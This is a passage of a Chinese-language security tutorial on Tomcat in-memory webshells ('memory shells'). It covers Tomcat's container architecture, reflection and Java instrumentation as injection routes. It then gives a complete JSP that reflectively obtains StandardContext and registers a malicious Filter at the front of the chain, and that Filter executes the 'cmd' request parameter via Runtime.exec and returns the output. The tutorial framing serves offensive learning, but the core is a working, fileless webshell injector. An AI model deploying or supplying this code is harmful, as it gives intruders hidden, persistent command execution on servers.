style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // -------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // ServletContextListener implementation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // -------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void contextInitialized(ServletContextEvent sce) {   // 初始化资源，例如打开数据库连接池等:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      /* This method is called when the servlet context is</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         initialized(when the Web application is deployed). </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         You can initialize servlet context related data here.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void contextDestroyed(ServletContextEvent sce) { // 清理WebApp,例如关闭数据库连接池等</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      /* This method is invoked when the Servlet Context </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         (the Web application) is undeployed or </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         Application Server shuts down.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // -------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // HttpSessionListener implementation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // -------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void sessionCreated(HttpSessionEvent se) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        /* Session is created. */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void sessionDestroyed(HttpSessionEvent se) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        /* Session is destroyed. */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // -------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // HttpSessionAttributeListener implementation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // -------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void attributeAdded(HttpSessionBindingEvent sbe) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      /* This method is called when an attribute </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         is added to a session.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void attributeRemoved(HttpSessionBindingEvent sbe) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      /* This method is called when an attribute</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         is removed from a session.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void attributeReplaced(HttpSessionBindingEvent sbe) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      /* This method is invoked when an attribute</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         is replaced in a session.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="tomcat">Tomcat<a href="#tomcat" class="hash-link" aria-label="Tomcat的直接链接" title="Tomcat的直接链接">​</a></h3>
<blockquote>
<p>简单理解，tomcat是http服务器+servlet容器。</p>
</blockquote>
<p>Tomcat 作为Servlet容器,将http请求文本接收并解析，然后封装成<code>HttpServletRequest</code>类型的request对象，传递给servlet；同时会将响应的信息封装为<code>HttpServletResponse</code>类型的response对象，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器。</p>
<p><img decoding="async" loading="lazy" alt="servlet工作流程_yuyibo95的博客-CSDN博客_servlet工作流程" src="/assets/images/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1eWlibzk1,size_16,color_FFFFFF,t_70-12bcba21e6939df7c82aeee91e3d7c7d.png" width="1356" height="640" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="tomcat架构设计">Tomcat架构设计<a href="#tomcat架构设计" class="hash-link" aria-label="Tomcat架构设计的直接链接" title="Tomcat架构设计的直接链接">​</a></h4>
<p>Tomcat 的本质其实就是一个 WEB 服务器 + 一个 Servlet 容器，那么它必然需要处理网络的连接与 Servlet 的管理，因此，Tomcat 设计了两个核心组件来实现这两个功能，分别是<strong>连接器</strong>和<strong>容器</strong>，<strong>连接器用来处理外部网络连接，容器用来处理内部 Servlet</strong></p>
<p>![tomcat](Tomcat内存马.assets/tomcat_3 拷贝.png)</p>
<p>一个 Tomcat 代表一个 Server 服务器，一个 Server 服务器可以包含多个 Service 服务，Tomcat 默认的 Service 服务是 Catalina，而一个 Service 服务可以包含多个连接器，因为 Tomcat 支持多种网络协议，包括 HTTP/1.1、HTTP/2、AJP 等等，一个 Service 服务还会包括一个容器，容器外部会有一层 Engine 引擎所包裹，负责与处理连接器的请求与响应，连接器与容器之间通过 <code>ServletRequest</code> 和 <code>ServletResponse</code> 对象进行交流。</p>
<p>在<code>Container</code>容器中包含4个子容器，且存在包含关系，分别是：</p>
<table><thead><tr><th style="text-align:center">容器</th><th style="text-align:center">实现类</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">Engine</td><td style="text-align:center">org.apache.catalina.core.StandardEngine</td><td style="text-align:center">最顶层容器组件，可以包含多个Host</td></tr><tr><td style="text-align:center">Host</td><td style="text-align:center">org.apache.catalina.core.StandardHost</td><td style="text-align:center">一个Host代表一个虚拟主机，如a.com、b.com，其下可以有多个Context</td></tr><tr><td style="text-align:center">Context</td><td style="text-align:center">org.apache.catalina.core.StandardContext</td><td style="text-align:center">一个Context代表一个Web应用，如/example、/ROOT、/manager，其下可有多个Wrapper</td></tr><tr><td style="text-align:center">Wrapper</td><td style="text-align:center">org.apache.catalina.core.StandardWrapper</td><td style="text-align:center">一个Wrapper通常代表一个Servlet，是对Servlet的封装</td></tr></tbody></table>
<p>一个engine可以对一个多个<code>host</code>，也就是虚拟主机，一个host可以对应多个<code>context</code>，也就是web应用，一个context对应多个<code>wrapper</code>，也就是<code>servlet</code>。这个映射关系，通过<code>mapper</code>组件来关联，<code>mapper</code>组件保存了Web应用的配置信息，容器组件与访问路径的映射关系。Host容器的域名，Context容器中的web路径，Wrapper容器中的servlet映射的路径，这些配置信息是多层次的Map。根据请求定位到指定servlet的流程图如下：</p>
<p>![tomcat](Tomcat内存马.assets/tomcat_6 拷贝.png)</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="其他知识">其他知识<a href="#其他知识" class="hash-link" aria-label="其他知识的直接链接" title="其他知识的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="反射">反射<a href="#反射" class="hash-link" aria-label="反射的直接链接" title="反射的直接链接">​</a></h4>
<p><img decoding="async" loading="lazy" alt="Java反射技术- Java小斌- 博客园" src="/assets/images/1230005-20181211093500360-1978531349-ce99683d030a3a62e94891f79ab911e0.png" width="1165" height="478" class="img_ev3q"></p>
<p>反射提供的功能，能在运行时（动态）的</p>
<ol>
<li>
<p>获取一个类的所有成员变量和方法</p>
</li>
<li>
<p>创建一个类的对象</p>
<p>a. 获取对象成员变量&amp;赋值</p>
<p>b. 调用对象的方法</p>
<p>c. 判断对象所属的类</p>
</li>
</ol>
<p>在注入内存马的过程当中，我们可能需要用到反射机制，例如注入一个servlet型的内存马，我们需要使用反射机制来获取当前的context，然后将恶意的servlet（wrapper）添加到当前的context的children中。</p>
<p>在使用Java反射机制时，主要步骤包括：</p>
<ol>
<li>获取目标类型的Class对象</li>
<li>通过Class对象分别获取<code>Constructor</code>类对象、<code>Method</code>类对象和<code>Field</code>类对象</li>
<li>通过Constructor类对象、Method类对象和Field类对象分别获取类的构造函数、方法&amp;属性的具体信息，并进行后续操作</li>
</ol>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="java-instrumentation">java instrumentation<a href="#java-instrumentation" class="hash-link" aria-label="java instrumentation的直接链接" title="java instrumentation的直接链接">​</a></h4>
<ul>
<li><a href="https://jifuwei.github.io/2019/06/04/instrument/" target="_blank" rel="noopener noreferrer">Java Intrumentation 和相关应用</a></li>
</ul>
<p>动态 Instrumentation 是 Java SE 5 的新特性，它在 <code>java.lang.instrument</code> 包中，它把 Java 的 instrument 功能从本地代码中释放出来，使其可以用 Java 代码的方式解决问题。使用 <code>Instrumentation</code>，开发者可以构建一个独立于应用程序的代理程序（Agent），用来监测和协助运行在 JVM 上的程序，甚至可以替换和修改某些类的定义。有了这样的功能，开发者就可以实现更为灵活的虚拟机监控和 Java的类操作了，这样的特性实际上提供了一种虚拟机级别支持的 AOP方式，使得开发者无需对原有应用做任何修改，就可以实现类的动态修改和增强</p>
<p><code>java.lang.instrument</code> 包被赋予了更强大的功能：启动后的 监测、本地代码（native code）监测，以及动态改变 <code>classpath</code> 等等。这些改变，意味着 Java 具有了更强的动态控制与解释能力，它使得 Java 语言变得更加灵活多变。</p>
<p><code>Java agent</code>是一种特殊的Java程序（Jar文件），它是<code>Instrumentation</code>的客户端。与普通Java程序通过main方法启动不同，agent并不是一个可以单独启动的程序，而必须依附在一个Java应用程序（JVM）上，与它运行在同一个进程中，通过<code>Instrumentation API</code>与虚拟机交互。
在注入内存马的过程中，我们可以利用java instrumentation机制，<strong>动态的修改已加载到内存中的类里的方法，进而注入恶意的代码</strong>。</p>
<p><img decoding="async" loading="lazy" alt="Java Intrumentation 和相关应用| 无知是天堂" src="/assets/images/VNL1ZF-54e764168cf52b4eae6ae0755f89a018.png" width="1190" height="697" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="servlet-api内存马编写">servlet-api内存马编写<a href="#servlet-api内存马编写" class="hash-link" aria-label="servlet-api内存马编写的直接链接" title="servlet-api内存马编写的直接链接">​</a></h2>
<blockquote>
<p>所有内存马编写时，都可以自己写一个对应的东西，比如filter、servlet，然后去跟一下Tomcat本身是如何去添加这些东西的，最后模拟一下这个过程动态添加就行了</p>
</blockquote>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="filter内存马">Filter内存马<a href="#filter内存马" class="hash-link" aria-label="Filter内存马的直接链接" title="Filter内存马的直接链接">​</a></h3>
<p>Filter 内存马是通过动态注册以一个恶意Filter，由于是动态注册的，所以这个filter没有文件实体，存在内存中，当tomcat重启就消失了</p>
<p>一般我们把这个Filter放在所有的filter最前面优先执行，也就是filter链的第一个，这样我们的请求就不会受到其他filter的干扰</p>
<p>需要动态注册filter就需要添加filter相关的库、函数等</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="servletcontext">ServletContext<a href="#servletcontext" class="hash-link" aria-label="ServletContext的直接链接" title="ServletContext的直接链接">​</a></h4>
<p>需要动态注册filter就需要几个添加filter相关的函数，<code>ServletContext</code>恰好可以满足这个条件</p>
<p><code>javax.servlet.servletContext</code>中存在<code>addFilter</code>，<code>addServlet</code>，<code>addListener</code>方法，即添加Filter，Servlet，Listener</p>
<p>获取ServletContext的方法：<code>this.getServletContext();</code>、<code>this.getServletConfig().getServletContext();</code></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="applicationcontext">ApplicationContext<a href="#applicationcontext" class="hash-link" aria-label="ApplicationContext的直接链接" title="ApplicationContext的直接链接">​</a></h4>
<p>在Tomcat中，<code>org.apache.catalina.core.ApplicationContext</code>中包含一个<code>ServletContext</code>接口的实现，所以需要引入<code>org.apache.catalina.core.ApplicationContext</code>这个库，<strong>用它获取上下文<code>StandardContext</code></strong></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="filter相关变量">Filter相关变量<a href="#filter相关变量" class="hash-link" aria-label="Filter相关变量的直接链接" title="Filter相关变量的直接链接">​</a></h4>
<table><thead><tr><th style="text-align:left">名称</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>filterMaps</code> 变量</td><td style="text-align:left">存放<code>FilterMap</code>的数组，在 <code>FilterMap</code> 中主要存放了 <code>FilterName</code> 和 对应的<code>URLPattern</code></td></tr><tr><td style="text-align:left"><code>filterDefs</code> 变量</td><td style="text-align:left">存放<code>FilterDef</code>的数组 ，<code>FilterDef</code> 中存储着我们过滤器名，过滤器实例等基本信息</td></tr><tr><td style="text-align:left"><code>filterConfigs</code> 变量</td><td style="text-align:left">存放<code>filterConfig</code>的数组，在 <code>FilterConfig</code> 中主要存放 <code>FilterDef</code> 和 <code>Filter</code>对象等信息</td></tr><tr><td style="text-align:left"><code>FilterChain</code> 变量</td><td style="text-align:left">过滤器链，该对象上的 <code>doFilter</code> 方法能依次调用链上的 <code>Filter</code></td></tr><tr><td style="text-align:left"><code>ApplicationFilterChain</code></td><td style="text-align:left">调用过滤器链</td></tr><tr><td style="text-align:left"><code>ApplicationFilterConfig</code></td><td style="text-align:left">获取过滤器</td></tr><tr><td style="text-align:left"><code>ApplicationFilterFactory</code></td><td style="text-align:left">组装过滤器链</td></tr><tr><td style="text-align:left"><strong><code>StandardContext</code></strong></td><td style="text-align:left">Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper**</td></tr><tr><td style="text-align:left"><code>StandardWrapperValve</code></td><td style="text-align:left">一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</td></tr></tbody></table>
<p><code>org.apache.catalina.core.ApplicationFilterConfig</code> 在tomcat不同版本需要通过不同的库引入<code>FilterMap</code>和<code>FilterDef</code></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// tomcat 7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.catalina.deploy.FilterMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.catalina.deploy.FilterDef;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// tomcat 8/9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.tomcat.util.descriptor.web.FilterMap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.tomcat.util.descriptor.web.FilterDef;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="动态注入内存">动态注入内存<a href="#动态注入内存" class="hash-link" aria-label="动态注入内存的直接链接" title="动态注入内存的直接链接">​</a></h4>
<blockquote>
<p>需要调试的话，直接给想要调试的代码写到servlet里面就可以调试了，避免去尝试调试JSP</p>
</blockquote>
<p>流程：</p>
<ol>
<li>
<p>创建一个恶意Filter</p>
</li>
<li>
<p>利用FilterDef对Filter进行一个封装</p>
</li>
<li>
<p>将FilterDef添加到FilterDefs和FilterConfig</p>
</li>
<li>
<p>创建FilterMap ，将我们的Filter和urlpattern相对应，存放到filterMaps中（由于Filter生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的Filter最先触发）</p>
</li>
</ol>
<p>Tomcat中的对应的<code>ServletContext</code>实现是<code>ApplicationContext</code>，在Web应用中获取的<code>ServletContext</code>实际上是<code>ApplicationContextFacade</code>对象，对<code>ApplicationContext</code>进行了封装，而<code>ApplicationContext</code>实例中又包含了<code>StandardContext</code>实例，以此来获取操作Tomcat容器内部的一些信息，例如Servlet的注册等。</p>
<p><img decoding="async" loading="lazy" alt="image-20211124091110131" src="/assets/images/image-20211124091110131-313dcbd70f65a966deabd9b2ceb0ef53.png" width="1410" height="1170" class="img_ev3q"></p>
<p>当我们能直接获取 request 的时候，可以直接将 <code>ServletContext</code> 转为 <code>StandardContext</code> 从而获取 <code>context</code>。</p>
<div class="language-jsp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-jsp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import = &quot;org.apache.catalina.Context&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import = &quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import = &quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import = &quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import = &quot;javax.servlet.*&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import = &quot;java.io.IOException&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import = &quot;java.lang.reflect.Constructor&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import = &quot;java.lang.reflect.Field&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import = &quot;java.util.Map&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;!-- tomcat8/9 我这里测试环境是tomcat9，请根据实际情况更改引入的包--&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 创建一个恶意的Filter，需要实现Filter接口</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    class filterDemo implements Filter {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public void init(FilterConfig filterConfig) throws ServletException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String cmd = servletRequest.getParameter(&quot;cmd&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if (cmd!= null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                Process process = Runtime.getRuntime().exec(cmd);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        new java.io.InputStreamReader(process.getInputStream()));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                StringBuilder stringBuilder = new StringBuilder();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                String line;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                while ((line = bufferedReader.readLine()) != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    stringBuilder.append(line + &#x27;\n&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                servletResponse.getOutputStream().flush();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                servletResponse.getOutputStream().close();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            filterChain.doFilter(servletRequest, servletResponse);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public void destroy() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    //从org.apache.catalina.core.ApplicationContext反射获取context方法</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServletContext servletContext =  request.getSession().getServletContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    appctx.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    stdctx.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Configs.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // filterConfigs 中存放的所有拦截器</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Map filterConfigs = (Map) Configs.get(standardContext);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    String name = &quot;filterDemo&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    //判断是否存在filterDemo1这个filter，如果没有则准备创建</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if (filterConfigs.get(name) == null){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //定义一些基础属性、类名、filter名等</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        filterDemo filter = new filterDemo();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        FilterDef filterDef = new FilterDef();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        filterDef.setFilterName(name);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        filterDef.setFilterClass(filter.getClass().getName());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        filterDef.setFilter(filter);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //添加filterDef</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        standardContext.addFilterDef(filterDef);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //创建filterMap，设置filter和url的映射关系,可设置成单一url如/xyz ,也可以所有页面都可触发可设置为/*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        FilterMap filterMap = new FilterMap();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // filterMap.addURLPattern(&quot;/*&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 这里可根据实际情况添加拦截器拦截的路由</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        filterMap.addURLPattern(&quot;/xyz&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        filterMap.setFilterName(name);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //添加我们的filterMap到所有filter最前面</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        standardContext.addFilterMapBefore(filterMap);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //反射创建FilterConfig，传入standardContext与filterDef</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        constructor.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //将filter名和配置好的filterConifg传入</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        filterConfigs.put(name,filterConfig);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        out.write(&quot;Inject success!&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    else{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        out.write(&quot;Injected!&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 